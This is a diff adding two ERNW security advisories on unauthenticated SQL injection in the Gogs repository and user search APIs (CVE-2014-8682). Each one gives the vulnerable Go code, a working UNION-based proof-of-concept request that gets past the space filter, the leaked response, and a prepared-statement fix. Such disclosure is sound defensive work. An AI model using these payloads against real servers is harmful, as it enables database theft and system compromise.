@@ -1,0 +1,362 @@
+Unauthenticated SQL Injection in Gogs repository search
+=======================================================
+Researcher: Timo Schmid <tschmid@ernw.de>
+
+
+Description
+===========
+Gogs(Go Git Service) is a painless self-hosted Git Service written in
+Go. (taken
+from [1])
+
+It is very similiar to the github hosting plattform. Multiple users can
+create
+multiple repositories and share code with others with the git version
+control
+system. Repositories can be marked as public or private to prevent
+access from
+unauthorized users.
+
+Gogs provides an api view to give javascript code the possibility to
+search for
+existing repositories in the system. This view is accessible at
+/api/v1/repos/search?q=<search query>.
+
+The q Parameter of this view is vulnerable to SQL injection.
+
+
+Exploitation Technique
+======================
+Remote
+
+
+Severity Level
+==============
+Critical
+
+
+CVSS Base Score
+===============
+8.3 (AV:N / AC:M / Au:N / C:C / I:P / A:P)
+
+
+CVE-ID
+======
+CVE-2014-8682
+
+Impact
+======
+The vulnerability results at least in a complete compromise of the database.
+Depending on the particular database configuration a compromise of the
+system
+is also possible.
+
+
+Status
+======
+Fixed by Vendor
+
+
+Vulnerable Code Section
+=======================
+models/repo.go:
+[...]
+// SearchRepositoryByName returns given number of repositories whose name
+contains keyword.
+func SearchRepositoryByName(opt SearchOption) (repos []*Repository, err
+error) {
+    // Prevent SQL inject.
+    opt.Keyword = FilterSQLInject(opt.Keyword)
+    if len(opt.Keyword) == 0 {
+        return repos, nil
+    }
+    opt.Keyword = strings.ToLower(opt.Keyword)
+
+    repos = make([]*Repository, 0, opt.Limit)
+
+    // Append conditions.
+    sess := x.Limit(opt.Limit)
+    if opt.Uid > 0 {
+        sess.Where("owner_id=?", opt.Uid)
+    }
+    if !opt.Private {
+        sess.And("is_private=false")
+    }
+    sess.And("lower_name like '%" + opt.Keyword + "%'").Find(&repos)
+    return repos, err
+}
+[...]
+
+The vulnerability exists because of a string concatination in the SQL
+query with
+user supplied data. Because of the SQL filter at the method entry, attackers
+can't use spaces (0x20) and since v0.5.6.1025-g83283b commas are also
+filtered.
+
+
+Proof of Concept
+================
+Request:
+http://www.example.com/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09
+(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09
+user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)
+%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09
+as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as
+%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09
+a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09
+JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN
+%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN
+%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN
+%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN
+%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN
+%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
+
+Response:
+{"data":[{"repolink":"bluec0re/test"},{"repolink":"bluec0re/secret"},{"repolink"
+:"bluec0re/root@localhost"}],"ok":true}
+
+
+Solution
+========
+This vulnerability could easily be fixed by using prepared statements:
+
+sess.And("lower_name like ?", "%" + opt.Keyword + "%").Find(&repos)
+
+Update to version 0.5.6.1105.
+
+
+Affected Versions
+=================
+>= v0.3.1-9-g49dc57e
+<= v0.5.6.1104-g0c5ba45
+
+
+Timeline
+========
+2014-09-25: Developer informed
+2014-10-16: Contact of developer regarding fix
+2014-10-25: Working together with developer on fix
+2014-11-03: Contacted developer
+2014-11-04: Fixed in master branch
+2014-11-14: CVE-ID assigned
+
+
+Credits
+=======
+Pascal Turbing <pturbing@ernw.de>
+Jiahua (Joe) Chen <u@gogs.io>
+
+
+References
+==========Update to version 0.5.6.1105.
+[1] https://github.com/gogits/gogs
+[2] http://gogs.io/
+[3]
+http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-1/
+[4]
+http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-2/
+[5]
+http://www.insinuator.net/2012/06/sql-injection-testing-for-business-purposes-part-3/
+[6] https://www.ernw.de/download/BC-1402.txt
+
+
+Advisory-ID
+===========
+BC-1402
+
+
+Disclaimer
+==========
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO
+warranties, implied or otherwise, with regard to this information or its
+use.
+Any use of this information is at the user's risk. In no event shall the
+author/
+distributor be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
+
+
+
+Unauthenticated SQL Injection in Gogs user search
+=================================================
+Researcher: Timo Schmid <tschmid@ernw.de>
+
+
+Description
+===========
+Gogs(Go Git Service) is a painless self-hosted Git Service written in
+Go. (taken
+from [1])
+
+It is very similiar to the github hosting plattform. Multiple users can
+create
+multiple repositories and share code with others with the git version
+control
+system. Repositories can be marked as public or private to prevent
+access from
+unauthorized users.
+
+Gogs provides an api view to give javascript code the possibility to
+search for
+existing users in the system. This view is accessible at
+/api/v1/users/search?q=<search query>.
+
+The q Parameter of this view is vulnerable to SQL injection.
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Critical
+
+
+CVSS Base Score
+===============
+8.3 (AV:N / AC:M / Au:N / C:C / I:P / A:P)
+
+
+CVE-ID
+======
+CVE-2014-8682
+
+
+Impact
+======
+The vulnerability results at least in a complete compromise of the database.
+Depending on the particular database configuration a compromise of the
+system
+is also possible.
+
+
+Status
+======
+Fixed by Vendor
+
+
+Vulnerable Code Section
+=======================
+models/user.go:
+[...]
+// SearchUserByName returns given number of users whose name contains
+keyword.
+func SearchUserByName(opt SearchOption) (us []*User, err error) {
+    opt.Keyword = FilterSQLInject(opt.Keyword)
+    if len(opt.Keyword) == 0 {
+        return us, nil
+    }
+    opt.Keyword = strings.ToLower(opt.Keyword)
+
+    us = make([]*User, 0, opt.Limit)
+    err = x.Limit(opt.Limit).Where("type=0").And("lower_name like '%" +
+opt.Keyword + "%'").Find(&us)
+    return us, err
+}
+[...]
+
+The vulnerability exists because of a string concatination in the SQL
+query with
+user supplied data. Because of the SQL filter at the method entry, attackers
+can't use spaces (0x20) and since v0.5.6.1025-g83283b commas are also
+filtered.
+
+
+Proof of Concept
+================
+Request:
+http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
+select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
+null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
+/**/mysql.db/**/where/**/('%25'%3D'
+
+Response:
+{"data":[{"username":"5.5.40-0ubuntu0.14.04.1","avatar":
+"//1.gravatar.com/avatar/"}],"ok":true}
+
+
+Solution
+========
+This vulnerability could easily be fixed by using prepared statements:
+
+err = x.Limit(opt.Limit).Where("type=0").And("lower_name like ?", "%" +
+opt.Keyword + "%").Find(&us)
+
+Update to version 0.5.6.1105.
+
+
+Affected Versions
+=================
+>= v0.3.1-9-g49dc57e
+<= v0.5.6.1104-g0c5ba45
+
+
+Timeline
+========
+2014-09-25: Developer informed
+2014-10-16: Contact of developer regarding fix
+2014-10-25: Working together with developer on fix
+2014-11-03: Contacted developer
+2014-11-04: Fixed in master branch
+2014-11-14: CVE-ID assigned
+
+
+Credits
+=======
+Pascal Turbing <pturbing@ernw.de>
+Jiahua (Joe) Chen <u@gogs.io>
+
+
+References
+==========
+[1] https://github.com/gogits/gogs
+[2] http://gogs.io/
+[3]
+http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-1/
+[4]
+http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-2/
+[5]
+http://www.insinuator.net/2012/06/sql-injection-testing-for-business-purposes-part-3/
+[6] https://www.ernw.de/download/BC-1403.txt
+
+
+Advisory-ID
+===========
+BC-1403
+
+
+Disclaimer
+==========
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO
+warranties, implied or otherwise, with regard to this information or its
+use.
+Any use of this information is at the user's risk. In no event shall the
+author/
+distributor be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
+
+
+--
+Timo Schmid
+
+ERNW GmbH, Carl-Bosch-Str. 4, 69115 Heidelberg  -  www.ernw.de
+Tel. +49 6221 480390 - Fax 6221 419008 - Cell +49 151 16227192
+PGP-FP 971B D4F7 5DD1 FCED 11FC 2C61 7AB6 927D 6F26 6CE0
+
+Handelsregister Mannheim: HRB 337135
+Geschaeftsfuehrer: Enno Rey
+
+==============================================================
+|| Blog: www.insinuator.net | | Conference: www.troopers.de ||
+==============================================================
+==================   TROOPERS15   ==================
+*   International IT Security Conference & Workshops
+*   16th - 20st March 2015 / Heidelberg, Germany
+*   www.troopers.de
+====================================================
